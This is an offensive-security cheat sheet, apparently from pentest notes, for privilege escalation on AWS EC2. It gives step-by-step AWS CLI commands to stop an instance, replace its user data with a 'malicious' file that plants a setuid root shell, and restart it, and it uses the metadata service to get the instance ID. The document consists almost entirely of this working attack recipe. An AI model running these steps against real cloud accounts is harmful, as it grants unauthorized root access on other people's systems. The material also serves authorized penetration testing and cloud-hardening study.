# AWS EC2 Userdata Privilege Escalation

## Requirements: Our user/role/policy has permissions to start and stop EC2 instances at will

### We can leverage user data to execute commands in the context of root on Linux at launch. In the example below we've added commands to create a copy of the root-owned binary /bin/sh and add the setuid bit, allowing us to run the binary as root (example). The EC2 instance has to be in a stopped state for us to update the user data.

## Steps

 - base64 userdata.txt > userdata.b64.txt (Encode our userdata with base64)

 - curl http://169.254.169.254/latest/meta-data/instance-id (We'll need to specify the ID of the EC2 instance to modify, and can get this from the metadata service.)

 - aws ec2 stop-instances --instance-id INSTANCE_ID (Stop EC2 Instance)

 - aws ec2 modify-instance-attribute --instance-id=INSTANCE_ID --attribute userData --value file://userdata.b64.txt (Update the userdata with our malicious file)

 - aws ec2 start-instances --instance-id INSTANCE_ID (Start EC2 Instance to load our malicious userdata file)

 - aws ec2 describe-instances --instance-ids INSTANCE_ID --query 'Reservations[*].Instances[*].PrivateIpAddress' --output text (Check the private IP address of the target instance. This is optional)







